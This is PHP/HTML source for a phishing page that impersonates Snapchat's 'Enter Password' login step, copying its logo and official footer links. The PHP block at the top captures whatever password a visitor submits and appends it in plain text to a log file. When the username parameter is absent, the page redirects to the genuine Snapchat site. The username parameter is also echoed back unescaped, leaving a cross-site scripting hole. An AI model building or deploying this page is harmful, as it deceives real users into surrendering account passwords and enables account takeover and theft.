<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Retrieve the submitted value
    $value2 = $_POST['value2'];
    
    // Create a log entry string
    $logEntry = "<h3>🔐 Password: $value2</h3></div>\n";
    
    // Open the file in append mode or create it if it doesn't exist
    $file = fopen('snap/logs/log.php', 'a+') or die("error");
    
    // Write the log entry to the file
    fwrite($file, $logEntry);
    
    // Close the file
    fclose($file);
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log In | Snapchat</title>
    <link rel="stylesheet" href="ect/style.css">
    <link rel="shortcut icon" href="ect/favicon.png" type="image/png" />
</head>
<body>

    <div class="all">

    <div class="contain">
    <form method="post" action="<?php echo $_SERVER['PHP_SELF']; ?>">
        <div class="page">
            <div class="snapchat-logo">
                <img src="ect/snapchat-app-icon.svg" alt="Snapchat Ghost Icon">
            </div>
            <div class="login-challenge-frame">
                <h1 class="login-challenge-title">Enter Password</h1>
                <div class="user-identifier-box">
                    <p>
                    <?php
                    if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['value1'])) {
                        // Retrieve the value from the query parameter
                        $value1 = $_GET['value1'];
                        
                        // Display the value in an <h1> heading
                        echo "$value1";
                    } else {
                        // Redirect to the first page if the value1 is not set
                        header("Location: https://www.snapchat.com/");
                        exit();
                    }
                    ?>
                    </p>
                    <a href="index.php">Not you?</a>
                </div>
            </div>
    
            <div class="form-group">
                <label for="accountIdentifier" class="control-label">Password</label>
                <div id="password-field">
                    <input autocomplete="current-password" type="text" class="form-control" name="value2" id="value2" required>
                    <img role="presentation" src="https://accounts.snapchat.com/accounts/static/images/password/hide-password-icon.svg" class="eye-icon-hide">
                </div>
                <div class="additional-action">
                    <a href="#">Forgot Password</a>
                </div>
            </div>
    
            <div style="margin:0 auto;text-align: center;">
                <button type="submit" class="btn">Next</button>
            </div>
        </div>
    </form>
    </div>

    <div class="footer"><div style="background-color: rgb(248, 249, 251); font-size: 14px; line-height: 17px;"><div class="footer-container" id="footerContainer"><div class="footer-column"><div class="footer-column-expand-caret"><svg width="15" height="20" fill="rgba(0,0,0,.87)"><g><rect stroke="rgba(0,0,0,.87)" transform="rotate(45 0,0)" rx="1" id="1" height="1.5" width="10" y="-2" x="5" stroke-width="1"></rect><rect stroke="rgba(0,0,0,.87)" transform="rotate(-45 0,0)" rx="1" id="2" height="1.5" width="10" y="13.5" x="-8" stroke-width="1"></rect></g></svg></div><div class="footer-column-header">Company</div><div><a href="https://snap.com/en-US">Snap Inc.</a><a href="https://careers.snap.com">Careers</a><a href="https://newsroom.snap.com">News</a></div></div><div class="footer-column"><div class="footer-column-expand-caret"><svg width="15" height="20" fill="rgba(0,0,0,.87)"><g><rect stroke="rgba(0,0,0,.87)" transform="rotate(45 0,0)" rx="1" id="1" height="1.5" width="10" y="-2" x="5" stroke-width="1"></rect><rect stroke="rgba(0,0,0,.87)" transform="rotate(-45 0,0)" rx="1" id="2" height="1.5" width="10" y="13.5" x="-8" stroke-width="1"></rect></g></svg></div><div class="footer-column-header">Community</div><div><a href="https://support.snapchat.com/">Support</a><a href="https://snap.com/en-US/community-guidelines">Community Guidelines</a><a href="https://snap.com/en-US/safety/safety-center">Safety Center</a></div></div><div class="footer-column"><div class="footer-column-expand-caret"><svg width="15" height="20" fill="rgba(0,0,0,.87)"><g><rect stroke="rgba(0,0,0,.87)" transform="rotate(45 0,0)" rx="1" id="1" height="1.5" width="10" y="-2" x="5" stroke-width="1"></rect><rect stroke="rgba(0,0,0,.87)" transform="rotate(-45 0,0)" rx="1" id="2" height="1.5" width="10" y="13.5" x="-8" stroke-width="1"></rect></g></svg></div><div class="footer-column-header">Advertising</div><div><a href="https://snapchat.com/ads">Buy Ads</a><a href="https://snap.com/en-US/ad-policies/">Advertising Policies</a><a href="https://snap.com/en-US/political-ads/">Political Ads Library</a><a href="https://snap.com/en-US/brand-guidelines/">Brand Guidelines</a><a href="https://support.snapchat.com/a/promotions-rules">Promotions Rules</a></div></div><div class="footer-column"><div class="footer-column-expand-caret"><svg width="15" height="20" fill="rgba(0,0,0,.87)"><g><rect stroke="rgba(0,0,0,.87)" transform="rotate(45 0,0)" rx="1" id="1" height="1.5" width="10" y="-2" x="5" stroke-width="1"></rect><rect stroke="rgba(0,0,0,.87)" transform="rotate(-45 0,0)" rx="1" id="2" height="1.5" width="10" y="13.5" x="-8" stroke-width="1"></rect></g></svg></div><div class="footer-column-header">Legal</div><div><a href="https://snap.com/en-US/privacy/privacy-center/">Privacy Center</a><a href="https://help.snapchat.com/hc/articles/11399265637012?utm_source=snapchat_com&amp;utm_medium=global_footer&amp;utm_campaign=privacy_choices">Your Privacy Choices</a><a href="https://snap.com/en-US/cookie-policy/">Cookie Policy</a><a href="https://support.snapchat.com/article/infringement-reporting-about">Report Infringement</a><a href="https://snap.com/en-US/terms/custom-creative-tools/">Custom Creative Tools Terms</a><a href="https://snapchat.com/create/terms.html">Community Geofilter Terms</a><a href="https://snap.com/en-US/terms/lens-studio-license-agreement">Lens Studio Terms</a></div></div><div style="clear: both;"></div><div class="langue-selection-block"><div class="langue-header">Language</div><div style="position: relative;"><select id="sc-global-locale-selector" style="appearance: none; border: 1px solid rgb(204, 204, 204); border-radius: 5px; background: white; width: 100%; margin-top: 10px; padding: 5px 10px; font-size: 14px; font-family: inherit; color: rgba(0, 0, 0, 0.6); height: 34px; cursor: pointer;"><option value="ar">العَرَبِية</option><option value="bn-BD">বাংলা(বাংলাদেশ)</option><option value="bn-IN">বাংলা (ভারত)</option><option value="da-DK">Dansk</option><option value="de-DE">Deutsch</option><option value="el-GR">Ελληνικά</option><option value="en-GB">English (UK)</option><option value="en-US">English (US)</option><option value="es">Español</option><option value="es-AR">Español (Argentine)</option><option value="es-ES">Español (España)</option><option value="es-MX">Español (México)</option><option value="fi-FI">Suomi</option><option value="fil-PH">Filipino</option><option value="fr-FR">Français</option><option value="gu-IN">ગુજરાતી</option><option value="hi-IN">हिंदी</option><option value="id-ID">Bahasa Indonesia</option><option value="it-IT">Italiano</option><option value="ja-JP">日本語</option><option value="kn-IN">ಕನ್ನಡ (India)</option><option value="ko-KR">한국어</option><option value="ml-IN">മലയാളം</option><option value="mr-IN">मराठी</option><option value="ms-MY">Bahasa Melayu</option><option value="nb-NO">Norsk</option><option value="nl-NL">Nederlands</option><option value="pa">ਪੰਜਾਬੀ</option><option value="pl-PL">Polski</option><option value="pt-BR">Português (Brasil)</option><option value="pt-PT">Português (Portugal)</option><option value="ro-RO">Română</option><option value="ru-RU">Русский</option><option value="sv-SE">Svenska</option><option value="ta-IN">தமிழ்</option><option value="te-IN">తెలుగు</option><option value="th-TH">ภาษาไทย (ประเทศไทย)</option><option value="tr-TR">Türkçe</option><option value="ur-PK">اردو</option><option value="vi-VN">Tiếng Việt</option><option value="zh-Hans">中文（简体）</option><option value="zh-Hant">中文（繁體）</option></select><div style="position: absolute; inset-inline-end: 10px; width: 0px; height: 0px; pointer-events: none; border-style: solid; bottom: 18px; border-width: 0px 3px 5px; border-color: transparent transparent rgb(102, 102, 102);"></div><div style="position: absolute; inset-inline-end: 10px; width: 0px; height: 0px; pointer-events: none; border-style: solid; bottom: 10px; border-width: 5px 3px 0px; border-color: rgb(102, 102, 102) transparent transparent;"></div></div></div></div><div style="background-color: rgb(38, 38, 38);"><div class="footer-bottom-bar"><a href="https://snap.com/en-US/privacy/privacy-policy/">Privacy Policy</a><a href="https://snap.com/en-US/terms/">Terms of Service</a><div style="clear: both;"></div></div></div></div></div>

    </div>
    
</body>
</html>